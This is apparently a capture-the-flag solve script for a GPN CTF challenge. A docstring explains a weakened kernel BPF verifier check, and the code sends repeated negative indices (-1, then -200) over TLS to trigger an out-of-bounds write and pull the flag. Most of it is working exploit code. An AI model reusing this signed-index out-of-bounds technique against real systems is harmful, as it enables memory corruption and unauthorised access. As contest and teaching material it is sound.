#!/usr/bin/env python3
"""
Stupidcontract reverse — patched kernel BPF verifier weakened so signed
out-of-bounds writes are allowed. try_get_reservation reads u64 index,
signed-checks <=99, then writes a win bit to bss[index+1]. Passing -1 makes
the BPF program write to bss[0] = SUCCESS[0], which gates the flag.

Each call has ~20% win chance. The LAST write to bss[0] decides — so we
spam -1 until we see "Your reservation succeeded", then switch to a
non-overwriting index (e.g. -200) to consume remaining iterations.
"""
import socket
import ssl
import sys

HOST = "butter-basted-mole-nestled-in-charred-tapenade-fs6z.gpn24.ctf.kitctf.de"
PORT = 443

sock = socket.create_connection((HOST, PORT))
ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE
ssock = ctx.wrap_socket(sock, server_hostname=HOST)

PROMPT = b"index ("

buf = b""
won = False

def read_until(needle, timeout=30):
    global buf
    ssock.settimeout(timeout)
    while needle not in buf:
        try:
            chunk = ssock.recv(65536)
        except socket.timeout:
            return False
        if not chunk:
            return False
        buf += chunk
        sys.stdout.buffer.write(chunk)
        sys.stdout.flush()
    return True

# Wait for first prompt
read_until(PROMPT)

iteration = 0
while iteration < 305:
    iteration += 1
    if not won:
        # Try to set SUCCESS[0] via OOB
        ssock.sendall(b"-1\n")
    else:
        # Already won — write somewhere that doesn't touch SUCCESS[0..100].
        # Index -200 writes to bss[-199], far outside the validate range.
        ssock.sendall(b"-200\n")

    # Consume the prompt portion that's already in buf
    idx = buf.find(PROMPT)
    if idx >= 0:
        buf = buf[idx + len(PROMPT):]

    if not read_until(PROMPT, timeout=15):
        break

    # Check if the most recent response was a success
    if b"reservation succeeded" in buf and not won:
        won = True
        print(f"\n*** [iter {iteration}] SUCCESS — switching to neutral index ***\n")

# After loop, server runs validate_reservations and reads SUCCESS[0]
ssock.settimeout(30)
try:
    while True:
        chunk = ssock.recv(65536)
        if not chunk:
            break
        buf += chunk
        sys.stdout.buffer.write(chunk)
        sys.stdout.flush()
except Exception:
    pass

print("\n--- Done ---")
if b"GPNCTF{" in buf:
    i = buf.find(b"GPNCTF{")
    j = buf.find(b"}", i) + 1
    print("FLAG:", buf[i:j].decode())
